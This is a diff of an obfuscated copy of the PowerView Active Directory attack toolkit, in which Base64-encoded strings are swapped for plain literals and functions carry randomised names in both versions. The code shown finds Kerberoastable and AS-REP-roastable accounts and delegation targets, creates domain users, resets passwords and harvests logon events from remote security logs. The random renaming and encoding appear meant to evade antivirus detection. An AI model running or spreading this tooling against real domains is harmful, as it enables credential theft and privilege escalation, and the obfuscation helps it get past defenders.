-                    $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | vqxllx -OutputType Canonical
+                elseif ($IdentityInstance.Contains('\')) {
+                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | jjxazw -OutputType Canonical
                     if ($ConvertedIdentityInstance) {
-                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
-                        $UserName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRVc2VyTmFtZSk=")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFeHRyYWN0ZWQgZG9tYWluICckVXNlckRvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
-                        $UserSearcher = ltdynu @SearcherArguments
+                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
+                        $UserName = $IdentityInstance.Split('\')[1]
+                        $IdentityFilter += "(samAccountName=$UserName)"
+                        $SearcherArguments['Domain'] = $UserDomain
+                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
+                        $UserSearcher = vydvzz @SearcherArguments
                     }
                 }
                 else {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
+                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                 }
             }
 
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1BO")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIG5vbi1udWxsIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWVz")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZpY2VQcmluY2lwYWxOYW1lPSop")))
+            if ($PSBoundParameters['SPN']) {
+                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
+                $Filter += '(servicePrincipalName=*)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3dEZWxlZ2F0aW9u")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBjYW4gYmUgZGVsZWdhdGVk")))
+            if ($PSBoundParameters['AllowDelegation']) {
+                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                 
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PTEwNDg1NzQpKQ==")))
+                $Filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=1048574))'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzYWxsb3dEZWxlZ2F0aW9u")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHdobyBhcmUgc2Vuc2l0aXZlIGFuZCBub3QgdHJ1c3RlZCBmb3IgZGVsZWdhdGlvbg==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0xMDQ4NTc0KQ==")))
+            if ($PSBoundParameters['DisallowDelegation']) {
+                Write-Verbose '[Get-DomainUser] Searching for users who are sensitive and not trusted for delegation'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=1048574)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWRtaW5Db3VudA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIGFkbWluQ291bnQ9MQ==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGFkbWluY291bnQ9MSk=")))
+            if ($PSBoundParameters['AdminCount']) {
+                Write-Verbose '[Get-DomainUser] Searching for adminCount=1'
+                $Filter += '(admincount=1)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RlZFRvQXV0aA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXJzIHRoYXQgYXJlIHRydXN0ZWQgdG8gYXV0aGVudGljYXRlIGZvciBvdGhlciBwcmluY2lwYWxz")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKQ==")))
+            if ($PSBoundParameters['TrustedToAuth']) {
+                Write-Verbose '[Get-DomainUser] Searching for users that are trusted to authenticate for other principals'
+                $Filter += '(msds-allowedtodelegateto=*)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJlYXV0aE5vdFJlcXVpcmVk")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBTZWFyY2hpbmcgZm9yIHVzZXIgYWNjb3VudHMgdGhhdCBkbyBub3QgcmVxdWlyZSBrZXJiZXJvcyBwcmVhdXRoZW50aWNhdGU=")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj00MTk0MzA0KQ==")))
+            if ($PSBoundParameters['PreauthNotRequired']) {
+                Write-Verbose '[Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBVc2luZyBhZGRpdGlvbmFsIExEQVAgZmlsdGVyOiAkTERBUEZpbHRlcg==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainUser] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
 
             
             $UACFilter | Where-Object {$_} | ForEach-Object {
-                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
+                if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
                     $UACValue = [Int]($UACEnum::$UACField)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
                     $UACValue = [Int]($UACEnum::$_)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
 
-            $UserSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY4KSRGaWx0ZXIp")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBmaWx0ZXIgc3RyaW5nOiB7MH0="))) -f $($UserSearcher.filter))
+            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
+            Write-Verbose ("[Get-DomainUser] filter string: {0}" -f $($UserSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $UserSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $UserSearcher.FindOne() }
             else { $Results = $UserSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                if ($PSBoundParameters['Raw']) {
                     
                     $User = $_
-                    $User.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXIuUmF3"))))
+                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User.Raw')
                 }
                 else {
-                    $User = hfjsvm -Properties $_.Properties
-                    $User.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlVzZXI="))))
+                    $User = tsuvgg -Properties $_.Properties
+                    $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                 }
                 $User
             }
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Vc2VyXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
+                    Write-Verbose ("[Get-DomainUser] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $UserSearcher.dispose()
@@ -3168,7 +3172,7 @@ function cqaorm {
 }
 
 
-function rdqyea {
+function kyghom {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -3210,51 +3214,51 @@ function rdqyea {
     $ContextArguments = @{
         'Identity' = $SamAccountName
     }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-    $Context = vfqaum @ContextArguments
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = aozfoj @ContextArguments
 
     if ($Context) {
         $User = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList ($Context.Context)
 
         
         $User.SamAccountName = $Context.Identity
-        $TempCred = New-Object System.Management.Automation.PSCredential(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YQ=="))), $AccountPassword)
+        $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
         $User.SetPassword($TempCred.GetNetworkCredential().Password)
         $User.Enabled = $True
         $User.PasswordNotRequired = $False
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZQ==")))]) {
+        if ($PSBoundParameters['Name']) {
             $User.Name = $Name
         }
         else {
             $User.Name = $Context.Identity
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlzcGxheU5hbWU=")))]) {
+        if ($PSBoundParameters['DisplayName']) {
             $User.DisplayName = $DisplayName
         }
         else {
             $User.DisplayName = $Context.Identity
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGVzY3JpcHRpb24=")))]) {
+        if ($PSBoundParameters['Description']) {
             $User.Description = $Description
         }
 
-        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBBdHRlbXB0aW5nIHRvIGNyZWF0ZSB1c2VyICckU2FtQWNjb3VudE5hbWU=")))
+        Write-Verbose "[New-DomainUser] Attempting to create user '$SamAccountName'"
         try {
             $Null = $User.Save()
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBVc2VyICckU2FtQWNjb3VudE5hbWUnIHN1Y2Nlc3NmdWxseSBjcmVhdGVk")))
+            Write-Verbose "[New-DomainUser] User '$SamAccountName' successfully created"
             $User
         }
         catch {
-            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W05ldy1Eb21haW5Vc2VyXSBFcnJvciBjcmVhdGluZyB1c2VyICckU2FtQWNjb3VudE5hbWUnIDogezB9"))) -f $_)
+            Write-Warning ("[New-DomainUser] Error creating user '$SamAccountName' : {0}" -f $_)
         }
     }
 }
 
 
-function uqupfj {
+function kquzch {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -3282,34 +3286,34 @@ function uqupfj {
     )
 
     $ContextArguments = @{ 'Identity' = $Identity }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ContextArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-    $Context = vfqaum @ContextArguments
+    if ($PSBoundParameters['Domain']) { $ContextArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Credential']) { $ContextArguments['Credential'] = $Credential }
+    $Context = aozfoj @ContextArguments
 
     if ($Context) {
         $User = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($Context.Context, $Identity)
 
         if ($User) {
-            Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEF0dGVtcHRpbmcgdG8gc2V0IHRoZSBwYXNzd29yZCBmb3IgdXNlciAnJElkZW50aXR5")))
+            Write-Verbose "[Set-DomainUserPassword] Attempting to set the password for user '$Identity'"
             try {
-                $TempCred = New-Object System.Management.Automation.PSCredential(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("YQ=="))), $AccountPassword)
+                $TempCred = New-Object System.Management.Automation.PSCredential('a', $AccountPassword)
                 $User.SetPassword($TempCred.GetNetworkCredential().Password)
 
                 $Null = $User.Save()
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFBhc3N3b3JkIGZvciB1c2VyICckSWRlbnRpdHknIHN1Y2Nlc3NmdWxseSByZXNldA==")))
+                Write-Verbose "[Set-DomainUserPassword] Password for user '$Identity' successfully reset"
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIEVycm9yIHNldHRpbmcgcGFzc3dvcmQgZm9yIHVzZXIgJyRJZGVudGl0eScgOiB7MH0="))) -f $_)
+                Write-Warning ("[Set-DomainUserPassword] Error setting password for user '$Identity' : {0}" -f $_)
             }
         }
         else {
-            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5Vc2VyUGFzc3dvcmRdIFVuYWJsZSB0byBmaW5kIHVzZXIgJyRJZGVudGl0eQ==")))
+            Write-Warning "[Set-DomainUserPassword] Unable to find user '$Identity'"
         }
     }
 }
 
 
-function sacfjp {
+function mzopuk {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -3406,16 +3410,16 @@ function sacfjp {
 "@
         $EventArguments = @{
             'FilterXPath' = $XPathFilter
-            'LogName' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHk=")))
+            'LogName' = 'Security'
             'MaxEvents' = $MaxEvents
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $EventArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Credential']) { $EventArguments['Credential'] = $Credential }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
 
-            $EventArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l")))] = $Computer
+            $EventArguments['ComputerName'] = $Computer
 
             Get-WinEvent @EventArguments| ForEach-Object {
                 $Event = $_
@@ -3424,7 +3428,7 @@ function sacfjp {
                     
                     4624 {
                         
-                        if(-not $Properties[5].Value.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JA=="))))) {
+                        if(-not $Properties[5].Value.EndsWith('$')) {
                             $Output = New-Object PSObject -Property @{
                                 ComputerName              = $Computer
                                 TimeCreated               = $Event.TimeCreated
@@ -3457,7 +3461,7 @@ function sacfjp {
                                 TargetLinkedLogonId       = $Properties[25].Value
                                 ElevatedToken             = $Properties[26].Value
                             }
-                            $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ29uRXZlbnQ="))))
+                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                             $Output
                         }
                     }
@@ -3465,7 +3469,7 @@ function sacfjp {
                     
                     4648 {
                         
-                        if((-not $Properties[5].Value.EndsWith(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JA=="))))) -and ($Properties[11].Value -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dGFza2hvc3RcLmV4ZQ=="))))) {
+                        if((-not $Properties[5].Value.EndsWith('$')) -and ($Properties[11].Value -match 'taskhost\.exe')) {
                             $Output = New-Object PSObject -Property @{
                                 ComputerName              = $Computer
                                 TimeCreated       = $Event.TimeCreated
@@ -3485,12 +3489,12 @@ function sacfjp {
                                 IpAddress         = $Properties[12].Value
                                 IpPort            = $Properties[13].Value
                             }
-                            $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uRXZlbnQ="))))
+                            $Output.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                             $Output
                         }
                     }
                     default {
-                        Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm8gaGFuZGxlciBleGlzdHMgZm9yIGV2ZW50IElEOiB7MH0="))) -f $($Event.Id))
+                        Write-Warning ("No handler exists for event ID: {0}" -f $($Event.Id))
                     }
                 }
             }
@@ -3499,7 +3503,7 @@ function sacfjp {
 }
 
 
-function tsvjlo {
+function ubzvol {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -3528,31 +3532,31 @@ function tsvjlo {
         $Credential = [Management.Automation.PSCredential]::Empty
     )
 
-    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxs")))}
+    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}
 
     $ForestArguments = @{}
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ForestArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+    if ($PSBoundParameters['Credential']) { $ForestArguments['Credential'] = $Credential }
 
     try {
-        $SchemaPath = (ongcjs @ForestArguments).schema.name
+        $SchemaPath = (cgxtvt @ForestArguments).schema.name
     }
     catch {
-        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3Q=")))
+        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
     }
     if (-not $SchemaPath) {
-        throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiByZXRyaWV2aW5nIGZvcmVzdCBzY2hlbWEgcGF0aCBmcm9tIEdldC1Gb3Jlc3Q=")))
+        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
     }
 
     $SearcherArguments = @{
-        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ=="))) = $SchemaPath
-        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNjaGVtYUlER1VJRD0qKQ==")))
+        'SearchBase' = $SchemaPath
+        'LDAPFilter' = '(schemaIDGUID=*)'
     }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-    $SchemaSearcher = ltdynu @SearcherArguments
+    if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+    if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+    if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+    if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+    if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+    $SchemaSearcher = vydvzz @SearcherArguments
 
     if ($SchemaSearcher) {
         try {
@@ -3563,19 +3567,19 @@ function tsvjlo {
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
+                    Write-Verbose ("[Get-DomainGUIDMap] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $SchemaSearcher.dispose()
         }
         catch {
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogezB9"))) -f $_)
+            Write-Verbose ("[Get-DomainGUIDMap] Error in building GUID map: {0}" -f $_)
         }
     }
 
-    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SchemaPath.replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2NoZW1h"))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWQtUmlnaHRz"))))
-    $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENsYXNzPWNvbnRyb2xBY2Nlc3NSaWdodCk=")))
-    $RightsSearcher = ltdynu @SearcherArguments
+    $SearcherArguments['SearchBase'] = $SchemaPath.replace('Schema','Extended-Rights')
+    $SearcherArguments['LDAPFilter'] = '(objectClass=controlAccessRight)'
+    $RightsSearcher = vydvzz @SearcherArguments
 
     if ($RightsSearcher) {
         try {
@@ -3586,13 +3590,13 @@ function tsvjlo {
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiB7MH0="))) -f $_)
+                    Write-Verbose ("[Get-DomainGUIDMap] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $RightsSearcher.dispose()
         }
         catch {
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5HVUlETWFwXSBFcnJvciBpbiBidWlsZGluZyBHVUlEIG1hcDogezB9"))) -f $_)
+            Write-Verbose ("[Get-DomainGUIDMap] Error in building GUID map: {0}" -f $_)
         }
     }
 
@@ -3600,7 +3604,7 @@ function tsvjlo {
 }
 
 
-function aglnim {
+function auxvef {
 
 
     [OutputType('PowerView.Computer')]
@@ -3666,7 +3670,7 @@ function aglnim {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -3698,133 +3702,133 @@ function aglnim {
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
         
-        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; ("NOT_{0}" -f $_)}
         
-        dnsdja -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        inpqyn -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
